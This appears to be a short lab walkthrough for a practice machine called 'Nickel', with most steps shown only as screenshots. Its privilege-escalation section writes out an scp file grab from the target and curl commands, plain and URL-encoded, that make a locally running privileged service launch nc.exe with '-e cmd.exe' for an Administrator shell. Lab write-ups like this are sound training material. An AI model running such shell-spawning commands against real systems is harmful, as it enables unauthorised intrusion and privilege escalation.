# Nickel

Starting off with an nmap scan

![](<../../.gitbook/assets/image (3) (1) (1).png>)

Going to port 80

![](<../../.gitbook/assets/image (4) (1) (1).png>)



Intercepting the commands using burp suite we can identify what's going on

We could use burp to send a post request too but I made use of curl

![](<../../.gitbook/assets/image (7) (1) (1).png>)



Seems like it was base 64 encoded and can use the password to get initial foothold

![](<../../.gitbook/assets/image (16) (1).png>)

### Priv Esc

Going to the ftp directory

![](<../../.gitbook/assets/image (9) (1) (1).png>)

I transferred the file to my attacker machine using

`scp ariah@192.168.79.99:C:/ftp/Infrastructure.pdf .`

``

`The file was encrypted`

![Cracked the password using pdfcrack](<../../.gitbook/assets/image (6) (1) (1).png>)

``

Taking a look at the pdf

![
](<../../.gitbook/assets/image (5) (1) (1).png>)

An internal service seems to be running as authority

![](<../../.gitbook/assets/image (14) (1).png>)



We can make use of nc.exe by running it as a root user and get a shell as Administrator



So i ran

C:\Users\ariah\Desktop>curl [http://nickel/?cmd](http://nickel/?cmd) /c C:\Users\ariah\Desktop\nc.exe 127.0.0.1 4444 -e cmd.exe\


With url encoding

curl [http://nickel/?cmd%20%2Fc%20C%3A%5CUsers%5Cariah%5CDesktop%5Cnc.exe%20127.0.0.1%204444%20-e%20cmd.exe](http://nickel/?cmd%20%2Fc%20C%3A%5CUsers%5Cariah%5CDesktop%5Cnc.exe%20127.0.0.1%204444%20-e%20cmd.exe)

![](<../../.gitbook/assets/image (17) (1) (1).png>)

![](<../../.gitbook/assets/image (15) (1).png>)
